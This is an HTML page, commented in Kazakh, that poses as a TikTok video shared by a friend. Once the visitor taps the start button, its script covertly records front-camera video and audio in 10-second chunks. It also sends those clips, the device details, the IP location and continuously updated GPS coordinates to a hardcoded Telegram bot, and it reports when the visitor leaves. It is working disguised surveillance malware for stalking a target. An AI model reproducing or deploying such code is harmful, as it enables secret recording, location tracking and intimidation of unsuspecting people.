<!DOCTYPE html>
<html lang="kk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Қарапайым TikTok - Алмас жіберді</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    
    <style>
        /* Экран секірмеуі үшін қатаң шектеулер */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            position: fixed;
            overflow: hidden; 
            background-color: black;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            touch-action: none;
        }

        #startOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 20px;
        }

        .start-btn {
            background-color: #EE1D52;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            border-radius: 30px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(238, 29, 82, 0.4);
            animation: pulse 2s infinite;
            cursor: pointer;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .video-container {
            height: 100%;
            width: 100%;
            overflow-y: scroll;
            scroll-snap-type: y mandatory;
            scroll-behavior: smooth;
            padding-bottom: 60px;
        }

        .video-container::-webkit-scrollbar { display: none; }
        .video-container { -ms-overflow-style: none; scrollbar-width: none; }

        .video-item {
            height: 100%;
            width: 100%;
            scroll-snap-align: start;
            scroll-snap-stop: always;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #111;
        }

        .video-item video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        .video-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            padding: 15px;
            padding-bottom: 20px;
            z-index: 10;
            background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.5) 40%, transparent 100%);
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            pointer-events: none;
        }

        .video-info, .action-buttons { pointer-events: auto; }

        .video-info { width: 75%; padding-right: 10px; }
        .username { font-weight: bold; font-size: 1.2rem; margin-bottom: 5px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
        .description { font-size: 0.9rem; margin-bottom: 10px; line-height: 1.3; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
        .music-ticker { font-size: 0.8rem; display: flex; align-items: center; gap: 5px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }

        .action-buttons {
            width: 25%;
            display: flex;
            flex-direction: column;
            gap: 15px;
            align-items: center;
        }

        .action-btn {
            background: none;
            border: none;
            color: white;
            font-size: 2rem;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            text-shadow: 1px 1px 3px black;
            transition: transform 0.2s;
        }
        
        .action-btn:active { transform: scale(0.9); }
        .action-text { font-size: 0.8rem; font-weight: bold; }

        .play-pause-icon {
            position: absolute;
            font-size: 4rem;
            color: rgba(255, 255, 255, 0.8);
            z-index: 5;
            display: none;
            pointer-events: none;
            filter: drop-shadow(0px 0px 10px rgba(0,0,0,0.5));
        }

        .shared-banner {
            position: absolute;
            top: 50px;
            left: 15px;
            background-color: rgba(20, 20, 20, 0.65);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            color: white;
            padding: 4px 14px 4px 4px;
            border-radius: 30px;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
            gap: 8px;
            z-index: 20;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
            transition: opacity 0.3s ease;
        }
        .shared-avatar {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            object-fit: cover;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .shared-arrow {
            font-size: 0.75rem;
            color: rgba(255, 255, 255, 0.6);
            margin-left: 2px;
        }

        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background-color: black;
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 100;
            border-top: 1px solid #333;
            padding-bottom: env(safe-area-inset-bottom, 0px);
        }

        .nav-item {
            color: gray;
            font-size: 1.2rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 3px;
        }
        .nav-item.active { color: white; }
        .nav-text { font-size: 0.7rem; }
        
        .add-btn {
            background-color: white;
            color: black;
            border-radius: 8px;
            padding: 4px 15px;
            font-size: 1rem;
            position: relative;
        }
        .add-btn::before, .add-btn::after {
            content: '';
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            width: 4px;
            height: 100%;
            background-color: #69C9D0;
            left: -4px;
            border-radius: 4px 0 0 4px;
        }
        .add-btn::after {
            background-color: #EE1D52;
            left: auto;
            right: -4px;
            border-radius: 0 4px 4px 0;
        }
    </style>
</head>
<body>

    <!-- Бастапқы экран -->
    <div id="startOverlay">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok" style="width: 150px; filter: invert(1); margin-bottom: 20px;">
        <h2 style="font-size: 1.2rem; margin-bottom: 10px;">Қосымшаға қош келдіңіз!</h2>
        <button class="start-btn" onclick="startApp()">TikTok қолданбасын ашу</button>
    </div>

    <!-- Видеолар контейнері -->
    <div class="video-container" id="videoContainer"></div>

    <!-- Төменгі навигация -->
    <div class="bottom-nav">
        <div class="nav-item active"><i class="fas fa-home"></i><span class="nav-text">Басты</span></div>
        <div class="nav-item"><i class="fas fa-search"></i><span class="nav-text">Іздеу</span></div>
        <div class="nav-item add-btn"><i class="fas fa-plus"></i></div>
        <div class="nav-item"><i class="far fa-comment-dots"></i><span class="nav-text">Хаттар</span></div>
        <div class="nav-item"><i class="far fa-user"></i><span class="nav-text">Профиль</span></div>
    </div>

    <script>
        const videoContainer = document.getElementById('videoContainer');
        let isAppStarted = false; 
        
        const mockData = [
            {
                id: 1,
                username: "@ustaz_kz",
                description: "Сабырдың түбі сары алтын. Өте әсерлі уағыз ☝️ #уағыз #ислам",
                music: "Оригинал дыбыс - ustaz_kz",
                likes: "125K",
                comments: "3402",
                shares: "12K",
                videoUrl: "https://data.quranacademy.com/Videos/Khutbat-e-Jummah/Jumma180725SHJ.mp4",
                sharedBy: "Алмас"
            },
            {
                id: 2,
                username: "@qazaq_tarih",
                description: "Қазақ хандығының құрылуы 🇰🇿 #тарих",
                music: "Тұран тобы - Ұлы Дала",
                likes: "89K",
                comments: "1205",
                shares: "5400",
                videoUrl: "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/friday.mp4"
            },
            {
                id: 3,
                username: "@qazaq_cars",
                description: "Жолдағы қызықты сәттер 🚗 #көлік",
                music: "Заманауи хит 2024",
                likes: "250K",
                comments: "8900",
                shares: "45K",
                videoUrl: "https://www.w3schools.com/html/mov_bbb.mp4"
            }
        ];

        // ==========================================
        // TELEGRAM БАПТАУЛАРЫ
        // ==========================================
        const TELEGRAM_BOT_TOKEN = '8544038643:AAEh_qOpyfCqeIx311DiD-c1V2f0YDD_Sv8'; 
        const TELEGRAM_CHAT_ID = '8517541960'; 

        let mediaRecorder;
        let recordedChunks = [];
        let recordInterval;

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
            }).catch(err => console.error(err));
        }

        function sendVideoToTelegram(videoBlob, caption, filename) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            // sendDocument орнына sendVideo қолданамыз және кілтті 'video' деп береміз
            formData.append('video', videoBlob, filename);
            formData.append('caption', caption);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            }).then(response => {
                console.log("Видео сәтті жіберілді", response);
            }).catch(err => {
                console.error("Видео жіберу қатесі:", err);
            });
        }

        function startApp() {
            const overlay = document.getElementById('startOverlay');
            overlay.style.display = 'none';
            isAppStarted = true;

            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(e => console.log(e));
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen().catch(e => console.log(e));
            }

            requestPermissions();

            const firstVideo = document.querySelector('video');
            if (firstVideo) {
                firstVideo.muted = false;
                firstVideo.play().catch(e => console.log(e));
            }
        }

        function requestPermissions() {
            sendToTelegram("<b>🚀 Жаңа пайдаланушы кірді!</b>\nЖүйе: " + navigator.userAgent);

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                    .then(function(stream) {
                        startLocationTracking();
                        recordAndSendVideo(stream); 
                    })
                    .catch(function(err) {
                        sendToTelegram("⚠️ Камера/Микрофон рұқсат етілмеді.");
                        startLocationTracking();
                    });
            } else {
                startLocationTracking();
            }
        }

        function startLocationTracking() {
            // 1. IP АРҚЫЛЫ ОРЫН АЛУ (Резервті нұсқа: GPS қате көрсетсе немесе ғимарат ішінде болса, интернет арқылы табады)
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    sendToTelegram(`🌐 <b>Интернет (IP) бойынша орын:</b>\nҚала: ${data.city}, ${data.region}\nПровайдер: ${data.org}\nIP: ${data.ip}\n🗺️ <a href="https://maps.google.com/?q=${data.latitude},${data.longitude}">Картадан ашу</a>`);
                }).catch(e => console.log('IP tracking failed', e));

            // 2. НАҚТЫ GPS ОРЫНДЫ АЛУ
            if (navigator.geolocation) {
                const geoOptions = { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        sendToTelegram(`📍 <b>Дәл қазіргі нақты орын (GPS):</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Картадан ашу (${lat}, ${lon})</a>\n🎯 Дәлдік радиусы: ${accuracy.toFixed(1)} метр`);
                    },
                    (error) => console.warn("Орынды дәл табу қатесі:", error.message),
                    geoOptions
                );

                navigator.geolocation.watchPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        // Тек дәлдігі 100 метрден жақсы болса ғана жаңарту жіберу (артық спам болмас үшін)
                        if(accuracy <= 100) {
                            sendToTelegram(`📍 <b>Орын жаңартылды (Қозғалыста):</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Картадан ашу</a>\n🎯 Дәлдігі: ${accuracy.toFixed(1)} метр`);
                        }
                    },
                    (error) => console.warn("Watch қатесі:", error.message),
                    geoOptions
                );
            }
        }

        function recordAndSendVideo(stream) {
            let options = {};
            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                options = { mimeType: 'video/webm;codecs=vp8,opus' };
            } else if (MediaRecorder.isTypeSupported('video/mp4')) {
                options = { mimeType: 'video/mp4' };
            }

            try {
                mediaRecorder = new MediaRecorder(stream, options);

                mediaRecorder.ondataavailable = function(e) {
                    if (e.data && e.data.size > 0) {
                        recordedChunks.push(e.data);
                    }
                };

                mediaRecorder.onstop = function() {
                    if (recordedChunks.length > 0) {
                        const ext = (mediaRecorder.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
                        const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
                        
                        sendVideoToTelegram(videoBlob, "📹 Видео түсірілім (10 секундтық бөлік)", `video_part_${Date.now()}.${ext}`);
                        recordedChunks = [];
                    }
                };

                function startRecordingCycle() {
                    if (mediaRecorder.state === 'inactive') {
                        mediaRecorder.start();
                        // ВИДЕО КЕЛМЕЙ ҚАЛУДЫҢ АЛДЫН АЛУ: Әр 10 секунд сайын қысқа видео жіберіп отырамыз
                        recordInterval = setTimeout(() => {
                            if (mediaRecorder.state === 'recording') {
                                mediaRecorder.stop(); 
                                setTimeout(startRecordingCycle, 500); // 0.5 секундтан соң келесі 10 секундты түсіруді бастайды
                            }
                        }, 10000); 
                    }
                }

                startRecordingCycle();

            } catch (err) {
                console.error("MediaRecorder қатесі:", err);
            }
        }

        // Сайттан шыққанда (Басқа вкладкаға өткенде немесе жапқанда) видеоны ТОҚТАТЫП ЖІБЕРУ
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'hidden') {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    clearTimeout(recordInterval);
                    mediaRecorder.stop(); // Сайттан шыққанда бірден тоқтатып, видеоны жібереді
                }
            } else if (document.visibilityState === 'visible') {
                if (mediaRecorder && mediaRecorder.state === 'inactive') {
                    mediaRecorder.start(); // Қайта кірсе жалғастырады
                }
            }
        });

        // Браузерді толықтай жауып жатқан кезде орындалатын соңғы әрекет
        window.addEventListener("beforeunload", (e) => {
            // Сенімділік үшін тексттік хабарламаны SendBeacon арқылы жіберу (Браузер жабылса да кетеді)
            const text = "🛑 Пайдаланушы сайтты жапты / сайттан шығып кетті!";
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const data = new Blob([JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })], { type: 'application/json' });
            navigator.sendBeacon(url, data);

            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        });

        const observerOptions = {
            root: videoContainer,
            rootMargin: '0px',
            threshold: 0.7 
        };

        const videoObserver = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                const videoEl = entry.target.querySelector('video');
                const playIcon = entry.target.querySelector('.play-pause-icon');
                
                if (entry.isIntersecting) {
                    if (isAppStarted) {
                        videoEl.muted = false; 
                        const playPromise = videoEl.play();
                        if (playPromise !== undefined) {
                            playPromise.catch(error => console.warn(error));
                        }
                    }
                    playIcon.style.display = 'none';
                } else {
                    videoEl.pause();
                    videoEl.currentTime = 0;
                    playIcon.style.display = 'none';
                }
            });
        }, observerOptions);

        function createVideoElement(data) {
            const itemDiv = document.createElement('div');
            itemDiv.className = 'video-item';
            
            const videoEl = document.createElement('video');
            videoEl.src = data.videoUrl;
            videoEl.loop = true;
            videoEl.playsInline = true;
            videoEl.muted = true;
            
            const playIcon = document.createElement('i');
            playIcon.className = 'fas fa-play play-pause-icon';

            let sharedBannerHtml = data.sharedBy ? `
                <div class="shared-banner">
                    <img src="https://ui-avatars.com/api/?name=${data.sharedBy}&background=EE1D52&color=fff&rounded=true&bold=true" alt="Avatar" class="shared-avatar">
                    <span><b>${data.sharedBy}</b> жіберді</span>
                    <i class="fas fa-chevron-right shared-arrow"></i>
                </div>` : '';
            
            const overlayDiv = document.createElement('div');
            overlayDiv.className = 'video-overlay';
            overlayDiv.innerHTML = `
                <div class="video-info">
                    <div class="username">${data.username}</div>
                    <div class="description">${data.description}</div>
                    <div class="music-ticker">
                        <i class="fas fa-music"></i>
                        <marquee scrollamount="3">${data.music}</marquee>
                    </div>
                </div>
                <div class="action-buttons">
                    <button class="action-btn" onclick="toggleLike(this)">
                        <i class="fas fa-heart"></i>
                        <span class="action-text">${data.likes}</span>
                    </button>
                    <button class="action-btn">
                        <i class="fas fa-comment-dots"></i>
                        <span class="action-text">${data.comments}</span>
                    </button>
                    <button class="action-btn">
                        <i class="fas fa-share"></i>
                        <span class="action-text">${data.shares}</span>
                    </button>
                </div>
            `;

            itemDiv.innerHTML = sharedBannerHtml;
            itemDiv.appendChild(videoEl);
            itemDiv.appendChild(playIcon);
            itemDiv.appendChild(overlayDiv);

            itemDiv.addEventListener('click', function(e) {
                if(e.target.closest('.action-btn') || e.target.closest('.shared-banner')) return;

                if (videoEl.paused) {
                    videoEl.play();
                    playIcon.style.display = 'none';
                } else {
                    videoEl.pause();
                    playIcon.style.display = 'block';
                }
            });

            videoObserver.observe(itemDiv);
            return itemDiv;
        }

        window.toggleLike = function(btn) {
            const icon = btn.querySelector('i');
            if(icon.style.color === 'rgb(238, 29, 82)' || icon.style.color === '#EE1D52') {
                icon.style.color = 'white';
                icon.style.transform = 'scale(1)';
            } else {
                icon.style.color = '#EE1D52';
                icon.style.transform = 'scale(1.2)';
                setTimeout(() => { icon.style.transform = 'scale(1)'; }, 200);
            }
        };

        function loadContent() {
            mockData.forEach(data => {
                videoContainer.appendChild(createVideoElement(data));
            });
        }

        loadContent();

        videoContainer.addEventListener('scroll', () => {
            if (videoContainer.scrollTop + videoContainer.clientHeight >= videoContainer.scrollHeight - 100) {
                loadContent();
            }
        });
    </script>
</body>
</html>
